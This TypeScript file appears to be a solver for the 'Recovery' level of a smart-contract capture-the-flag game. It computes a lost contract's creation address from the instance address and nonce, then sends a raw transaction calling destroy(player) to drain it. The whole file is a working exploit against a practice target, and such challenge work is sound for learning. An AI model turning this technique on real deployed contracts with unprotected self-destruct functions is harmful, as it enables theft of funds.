import { EthereumClient } from '../ethereum/ethereum-client';
import { Attacker } from './attacker-provider';

export const RECOVERY_LEVEL_NAME = "Recovery"

export const recoveryAttacker = (): Attacker => {
    return {
        attack: async (ethereum: EthereumClient, instanceAddress: string) => {
            const player = await ethereum.getPlayerAddress();
            console.log('Calculating target address');
            const calldata = ethereum.createCallData('destroy', ['address'], [player]);

            const computed = ethereum.calculateContractCreationAddress(instanceAddress, 1);
            console.log('Target address: ', computed);
            
            console.log('Destroying and depleting target');
            const tx = await ethereum.sendRawTx({to: computed, data: calldata});
            await tx.wait();
        }
    }
}